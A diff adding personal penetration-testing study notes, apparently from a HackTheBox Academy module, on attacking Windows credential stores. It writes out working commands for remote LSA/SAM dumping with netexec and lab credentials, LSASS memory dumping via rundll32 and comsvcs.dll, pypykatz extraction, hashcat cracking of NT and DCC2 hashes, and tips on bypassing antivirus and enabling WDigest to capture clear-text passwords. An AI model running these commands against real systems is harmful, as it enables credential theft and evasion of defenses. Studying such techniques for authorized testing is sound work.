@@ -116,3 +116,153 @@ Older systems (such as those prior to Windows Vista and Windows Server 2008) may
 
 ## Cracking hashes with Hashcat
 
+```sh
+sudo hashcat -m 1000 hashestocrack.txt
+```
+
+## DCC2 Hashes
+
+`hklm\security` contains cached domain logon information, specifically the form of DCC2 hashes. These are local, hashed copies of network credentials hashes.
+
+```sh
+inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
+```
+
+```sh
+hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
+```
+
+## DPAPI
+
+We previously saw **machines and user keys** for **DPAPI** also dumped from `hklm\security`, **DPAPI** is an API for windows used to encrypt and decrypt data blobs on a per-user basis.
+
+|Applications|Use of DPAPI|
+|---|---|
+|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
+|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
+|`Outlook`|Passwords for email accounts.|
+|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
+|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|
+
+```ad-note
+DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).
+```
+
+![[DPAPI Dump.png]]
+## Remote dumping & LSA secrets considerations
+
+When we have **Local Admin Access** on a host, we can dump LSA secrets over network.
+
+### Dumping LSA Remotely
+
+```sh
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+```
+
+### Dumping SAM Remotely
+
+```sh
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+```
+
+---
+# Attacking LSASS
+
+![[Attacking LSASS.png]]
+
+LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.
+
+Upon initial logon, LSASS will:
+
+- Cache credentials locally in memory
+- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
+- Enforce security policies
+- Write to Windows' [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)
+
+## Dumping LSASS process memory
+
+It is advised to generate a dump file for the LSASS process then extract the credentials offline using our attack host. We are going to cover some techniques to complete this operation.
+### Task Manager method
+
+The Task Manager method is dependent on us having a GUI-based interactive session with a target.
+
+1. Open `Task Manager`
+2. Select the `Processes` tab
+3. Find and right click the `Local Security Authority Process`
+4. Select `Create dump file`
+
+### Rundll32.exe & Comsvcs.dll method
+
+It is important to note that modern anti-virus tools recognize this method as malicious activity.
+
+Before creating the dump file, we must determine the `PID` assigned to the `lsass.exe` process. This can be done using CMD/PowerShell:
+
+**Finding LSASS's PID in CMD**
+
+```PowerShell
+tasklist /svc
+```
+
+**Finding LSASS's PID in PowerShell**
+
+```PowerShell
+Get-Process lsass
+```
+
+Once we have the PID assigned to the LSASS process, we can create a dump file.
+
+#### Creating a dump file using PowerShell
+
+With an elevated PowerShell session, we can issue the following command to create a dump file:
+
+```PowerShell
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump PID C:\lsass.dmp full
+```
+
+With this command we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which is also calls the `MiniDumpWriteDump` (`MiniDump`) function to dump the LSASS.
+
+> [!danger]
+> Recall that this approach is recognized as malicious and most AVs will prevent it from execution. We need to find ways to bypass or disable AV tool we're facing.
+
+## Using Pypykatz to extract credentials
+
+```sh
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp
+```
+
+We use `lsa` in the command because LSASS is a subsystem of `LSA`, then we specify data source as `minidump`.
+
+**Details about expected output:**
+
+***MSV:*** an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database.
+
+![[MSV.png]]
+
+
+***WDIGEST:*** an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in **clear-text**. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text.
+
+![[WDIGEST.png]]
+
+```ad-note
+Based on my personal experience in real-world pentest engagements, we can enable WDIGEST on target machines after getting administrative access on them by modifying the registry. Then we can wait for a high value target to login on the device so we extract its password
+```
+
+
+***Kerberos:*** a network authentication protocol used by Active Directory in Windows Domain environments. LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos.
+
+```txt
+== Kerberos ==
+	Username: bob
+	Domain: DESKTOP-33E7O54
+```
+
+***DPAPI:*** `Mimikatz` and `Pypykatz` can extract the DPAPI `masterkey` for logged-on users whose data is present in LSASS process memory. These masterkeys can be used to decrypt the secretes associated with each application using DPAPI.
+
+![[Pypykatz DPAPI.png]]
+
+#### Cracking the NT Hash with Hashcat
+
+```sh
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+
